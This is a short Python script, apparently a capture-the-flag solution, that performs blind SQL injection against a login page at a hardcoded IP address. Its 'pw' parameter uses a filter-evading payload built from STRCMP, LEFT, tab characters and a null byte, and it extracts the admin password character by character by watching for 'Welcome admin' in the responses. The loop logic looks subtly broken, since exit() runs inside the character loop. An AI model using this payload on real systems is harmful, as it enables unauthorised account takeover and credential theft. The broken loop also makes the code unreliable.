import requests
import string
URL = 'http://35.200.215.237/'
LETTERS = string.digits+string.ascii_letters+"!#$&()*+,-./:;<=>?@[\]^_`{|}~"
password = ''
while True:
    flag = False
    for e in LETTERS:
        r = requests.get(
            URL,
            params={
                "pw"  :'||(STRCMP("admi"\t"n",user)\tis\tnot\tTRUE\t&&\tSTRCMP("{}",LEFT(pw,{}))\tis\tnot\tTRUE);\x00'.format(password+e,len(password+e)),
                "user":"a\\"
            }
        )
        if "Welcome admin" in r.text:
            password += e
            print(password)
            flag = True
            break
        if flag: continue
        exit()
